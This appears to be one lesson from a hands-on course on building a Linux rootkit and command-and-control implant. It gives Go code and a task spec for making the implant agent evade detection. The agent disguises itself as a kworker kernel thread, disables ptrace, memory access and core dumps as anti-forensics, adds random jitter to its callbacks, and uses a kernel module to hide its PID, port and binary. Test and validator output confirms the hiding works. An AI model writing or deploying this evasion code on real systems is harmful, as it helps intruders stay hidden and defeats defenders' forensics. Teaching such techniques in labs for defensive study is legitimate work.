# L23: Process Masquerade

L22 made the server invisible to browsers.
But the agent process still shows its real name in `ps` output.
A defender running `ps aux` sees an unfamiliar binary name.
The callback port appears in `ss`.
The binary sits in its path on disk.

Real implants disguise themselves as kernel threads.
BPFDoor renames itself to look like a kworker.
Sliver adds random jitter between callbacks so the timing pattern is not uniform.

## prctl PR_SET_NAME

Linux stores each thread's name in a 16-byte buffer (TASK_COMM_LEN).
`prctl(PR_SET_NAME, name)` overwrites it.
This is what `ps`, `top`, and `/proc/pid/comm` read.

Kernel worker threads show as `[kworker/0:1]` in `ps`.
The brackets are part of the name (the kernel adds them for threads
that have no userspace memory mapping).
`[kworker/0:1]` is 13 characters, which fits in TASK_COMM_LEN (16 bytes
including the null terminator).

```go
import "golang.org/x/sys/unix"

unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
```

Or with a direct syscall:

```go
name := [16]byte{}
copy(name[:], "[kworker/0:1]")
syscall.RawSyscall6(syscall.SYS_PRCTL, unix.PR_SET_NAME,
    uintptr(unsafe.Pointer(&name[0])), 0, 0, 0, 0)
```

## Anti-forensics: dumpable and core limits

Two settings prevent core dumps from leaking memory contents:

```go
// Prevent ptrace and /proc/pid/mem access
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)

// Set core dump size limit to zero
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
```

`PR_SET_DUMPABLE` set to 0 also restricts `/proc/pid/mem` and
`/proc/pid/maps` access, even for root.
Combined with the core limit, a crash produces no dump file.

## Callback jitter

A fixed callback interval (e.g., every 60 seconds) creates a detectable
pattern in network logs.
Adding random jitter makes the timing irregular:

```go
import "crypto/rand"

func jitter(base, spread time.Duration) time.Duration {
    var buf [8]byte
    rand.Read(buf[:])
    offset := time.Duration(binary.LittleEndian.Uint64(buf[:]) % uint64(spread))
    return base + offset
}
```

Use `crypto/rand`, not `math/rand`.
`math/rand` is deterministic and seeded predictably.

## Auto-hide on connect

When the agent connects to the server, it should immediately hide itself
using mkdir commands to the kernel module:

```text
  agent starts
       |
       v
  prctl PR_SET_NAME "[kworker/0:1]"
  prctl PR_SET_DUMPABLE 0
  setrlimit RLIMIT_CORE 0
       |
       v
  connect to server (mTLS)
       |
       v
  mkdir rklings.h.i.<own-pid>     # hide from ps
  mkdir rklings.h.p.<port>        # hide callback port
  mkdir rklings.h.f.<binary>      # hide binary from ls
       |
       v
  begin command loop with jitter
```

## You write

`main.go` (~60 lines):

- `prctl(PR_SET_NAME, "[kworker/0:1]")` to rename process
- `prctl(PR_SET_DUMPABLE, 0)` to prevent memory access
- `setrlimit(RLIMIT_CORE, 0)` to prevent core dumps
- Jitter function using `crypto/rand`
- Auto-hide: mkdir for own PID, callback port, and binary path on connect

## API

```go
import (
    "crypto/rand"
    "encoding/binary"
    "os"
    "syscall"
    "time"
    "unsafe"

    "golang.org/x/sys/unix"
)

// Rename process
unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)

// Prevent dumps
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})

// Own PID
os.Getpid()

// Jitter
var buf [8]byte
crypto_rand.Read(buf[:])
```

## Test it

```
$ rklings run l23
student@vm:~$ ./agent &
student@vm:~$ ps aux | grep kworker
root         7  0.0  0.0      0     0 ?  I    00:00 [kworker/0:0]
student   1234  0.0  0.1  12345  6789 ?  S    00:01 [kworker/0:1]
```

The agent appears as `[kworker/0:1]`.
It blends in with real kernel worker threads.
The only tell is the non-zero memory size, which `ps aux` shows but most
quick checks skip.

```
student@vm:~$ cat /proc/1234/comm
[kworker/0:1]
student@vm:~$ cat /proc/1234/maps
cat: /proc/1234/maps: Permission denied
```

`/proc/pid/maps` is blocked because dumpable is 0.

## Validate

```
$ rklings validate l23
  [+] agent process comm is [kworker/0:1]
  [+] /proc/pid/comm matches [kworker/0:1]
  [+] process not dumpable (PR_SET_DUMPABLE 0)
  [+] core dump limit is zero
  [+] agent PID hidden from ps
  [+] callback port hidden from ss
  [+] callback intervals vary (jitter working)
  PASS
```

## Next

The agent is invisible to casual inspection.
L24 scrubs the remaining forensic evidence: timestamps, shell history,
login records, and journal entries.
